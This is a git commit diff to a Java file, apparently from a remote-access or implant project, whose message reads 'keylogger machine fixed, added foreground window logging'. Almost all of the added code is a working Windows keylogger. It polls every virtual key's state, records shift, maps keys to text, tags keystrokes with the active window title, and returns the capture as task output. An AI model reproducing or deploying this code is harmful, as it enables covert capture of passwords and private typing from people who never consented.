9237121f4c1f5b209039e46cd64b904ecc6b7405
kryptops <kryptops@protonmail.com>
2020-09-06 16:53:50 -0400

    keylogger machine fixed, added foreground window logging

--- svc/dist/src/windows.java
+++ svc/dist/src/windows.java
@@ -295,38 +295,154 @@ public class windows {
 
 
     public static Hashtable asynckeystateLogger(Hashtable args) {
-        String keyOut = new String();
+
         Hashtable taskOut = new Hashtable();
-        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-            final User32 user32 = User32.INSTANCE;
-            LocalDateTime endTimes = LocalDateTime.now().plusSeconds(Integer.parseInt(args.get("duration").toString()));
-            StringBuilder keyStrokes = new StringBuilder();
+        final User32 user32 = User32.INSTANCE;
+        LocalDateTime endTimes = LocalDateTime.now().plusSeconds(Integer.parseInt(args.get("duration").toString()));
+        ArrayList keyStates = new ArrayList();
+        ArrayList shiftStates = new ArrayList();
+        Hashtable activeWindows = new Hashtable();
+        String windowTitle = new String();
 
-            while (LocalDateTime.now().isBefore(endTimes)) {
-                for (int k=1; k<254; k++) {
-                    short kState = user32.GetAsyncKeyState(k);
-                    if (kState == -32767) {
-                        short shiftA = user32.GetAsyncKeyState(160);
-                        short shiftB = user32.GetAsyncKeyState(161);
+        while (LocalDateTime.now().isBefore(endTimes)) {
+            String windowName = currentWindow(user32);
+            if (!windowTitle.equals(windowName)) {
+                windowTitle = windowName;
+                activeWindows.put(keyStates.size(),windowName);
+            }
 
-                        int scan = user32.MapVirtualKeyEx(k,MAPVK_VSC_TO_VK_EX, user32.GetKeyboardLayout(0));
-                        byte[] stateBytes = new byte[256];
-                        char[] keyStr = new char[5];
-                        User32.INSTANCE.ToUnicodeEx(k,scan,stateBytes,keyStr,keyStr.length,0,user32.GetKeyboardLayout(0));
-                        String literalValue = String.valueOf(keyStr);
-                        if (shiftA == -32767 || shiftA == -32768 || shiftB == -32767 || shiftB == -32768) {
-                            keyStrokes.append(literalValue.toUpperCase());
-                        } else {
-                            keyStrokes.append(literalValue);
-                        }
-                    }
+            //get the virtual key codes
+            for (int k = 0; k < 255; k++) {
+                //get states of virtual key codes
+                short kState = user32.GetAsyncKeyState(k);
+                if (kState == -32767) {
+                    shiftStates.add(user32.GetAsyncKeyState(Win32VK.VK_SHIFT.code));
+                    keyStates.add(k);
                 }
             }
-            keyOut = keyStrokes.toString();
-        } else {
-            keyOut = "error - operating system not compatible with this directive";
         }
-        taskOut.put("output",keyOut);
+
+        taskOut.put("output",stringifyKeys(shiftStates,keyStates,user32,activeWindows));
         return taskOut;
     }
+
+    public static Hashtable mapConstants() {
+        //https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
+        Hashtable constantTable = new Hashtable();
+        constantTable.put(VK_RETURN.code,"\\r\\n");
+        constantTable.put(VK_TAB.code,"\\t");
+        constantTable.put(VK_UP.code," [ARROW-UP] ");
+        constantTable.put(VK_DOWN.code," [ARROW-DOWN] ");
+        constantTable.put(VK_LEFT.code," [ARROW-LEFT] ");
+        constantTable.put(VK_RIGHT.code," [ARROW-RIGHT] ");
+        constantTable.put(VK_SNAPSHOT.code," [PRINTSCREEN] ");
+        constantTable.put(VK_ESCAPE.code," [ESC] ");
+        constantTable.put(VK_DELETE.code," [DELETE] ");
+        constantTable.put(VK_INSERT.code," [INSERT] ");
+        constantTable.put(VK_OEM_PLUS.code,"=+");
+        constantTable.put(VK_OEM_COMMA.code,",<");
+        constantTable.put(VK_OEM_MINUS.code,"-_");
+        constantTable.put(VK_OEM_PERIOD.code,".>");
+        constantTable.put(VK_OEM_1.code,";:");
+        constantTable.put(VK_OEM_2.code,"/?");
+        constantTable.put(VK_OEM_3.code,"`~");
+        constantTable.put(VK_OEM_4.code,"[{");
+        constantTable.put(VK_OEM_5.code,"\\|");
+        constantTable.put(VK_OEM_6.code,"]}");
+        constantTable.put(VK_OEM_7.code,"'\"");
+        constantTable.put(VK_F1.code," [f1] ");
+        constantTable.put(VK_F2.code," [f2] ");
+        constantTable.put(VK_F3.code," [f3] ");
+        constantTable.put(VK_F4.code," [f4] ");
+        constantTable.put(VK_F5.code," [f5] ");
+        constantTable.put(VK_F6.code," [f6] ");
+        constantTable.put(VK_F7.code," [f7] ");
+        constantTable.put(VK_F8.code," [f8] ");
+        constantTable.put(VK_F9.code," [f9] ");
+        constantTable.put(VK_F10.code," [f10] ");
+        constantTable.put(VK_F11.code," [f11] ");
+        constantTable.put(VK_F12.code," [f12] ");
+        constantTable.put(VK_F13.code," [f13] ");
+        constantTable.put(VK_F14.code," [f14] ");
+        constantTable.put(VK_F15.code," [f15] ");
+        constantTable.put(VK_F16.code," [f16] ");
+        constantTable.put(VK_F17.code," [f17] ");
+        constantTable.put(VK_F18.code," [f18] ");
+        constantTable.put(VK_F19.code," [f19] ");
+        constantTable.put(VK_F20.code," [f20]");
+        constantTable.put(VK_F21.code," [f21] ");
+        constantTable.put(VK_F22.code," [f22] ");
+        constantTable.put(VK_F23.code," [f23] ");
+        constantTable.put(VK_F24.code," [f24] ");
+        constantTable.put(VK_BACK.code," [BACKSPACE] ");
+        constantTable.put(VK_0.code,"0)");
+        constantTable.put(VK_1.code,"1!");
+        constantTable.put(VK_2.code,"2@");
+        constantTable.put(VK_3.code,"3#");
+        constantTable.put(VK_4.code,"4$");
+        constantTable.put(VK_5.code,"5%");
+        constantTable.put(VK_6.code,"6^");
+        constantTable.put(VK_7.code,"7&");
+        constantTable.put(VK_8.code,"8*");
+        constantTable.put(VK_9.code,"9(");
+        return constantTable;
+
+    }
+
+    public static String stringifyKeys(ArrayList shiftStates, ArrayList keyStates, User32 user32, Hashtable activeWindows) {
+        Hashtable constantTable = mapConstants();
+        StringBuilder keyStrokes = new StringBuilder();
+        System.out.println(activeWindows.toString());
+        for (int v = 0; v<keyStates.size();v++) {
+            if (activeWindows.containsKey(v)) {
+                keyStrokes.append("\\r\\n["+activeWindows.get(v).toString()+"]\\r\\n");
+            }
+            int virtualKey = (int) keyStates.get(v);
+            short shiftOn = (short) shiftStates.get(v);
+            if (constantTable.containsKey(virtualKey)) {
+                String keyMap = constantTable.get(virtualKey).toString();
+                if (keyMap.length() == 2) {
+                    if (shiftOn != 0) {
+                        keyStrokes.append(keyMap.charAt(1));
+                    } else {
+                        keyStrokes.append(keyMap.charAt(0));
+                    }
+                } else {
+                    keyStrokes.append(keyMap);
+                }
+            } else {
+
+                char[] keyStr = new char[5];
+                byte[] stateBytes = new byte[255];
+                //map virtual keys to scancodes
+                int scan = user32.MapVirtualKeyEx(virtualKey, MAPVK_VK_TO_VSC_EX, user32.GetKeyboardLayout(0));
+
+                //takes virtual key, scancode, key state as bytes array, receiving buffer, receiving buffer size, function behavior (0 / 2 are only options), locale identifier
+
+                user32.ToUnicodeEx(virtualKey, scan, stateBytes, keyStr, keyStr.length, 0, user32.GetKeyboardLayout(0));
+
+                if (keyStr[0] != -1) {
+                    String keyVal = String.valueOf(keyStr);
+
+                    if (shiftOn == 0) {
+                        keyStrokes.append(keyVal);
+                    } else {
+                        keyStrokes.append(keyVal.toUpperCase());
+                    }
+                } else {
+                    continue;
+                }
+            }
+
+        }
+        return keyStrokes.toString();
+    }
+
+    public static String currentWindow(User32 user32) {
+        char[] windowName = new char[256];
+        HWND windowHandle = user32.GetForegroundWindow();
+        user32.GetWindowText(windowHandle,windowName, 256);
+        return String.valueOf(windowName);
+    }
+
 }
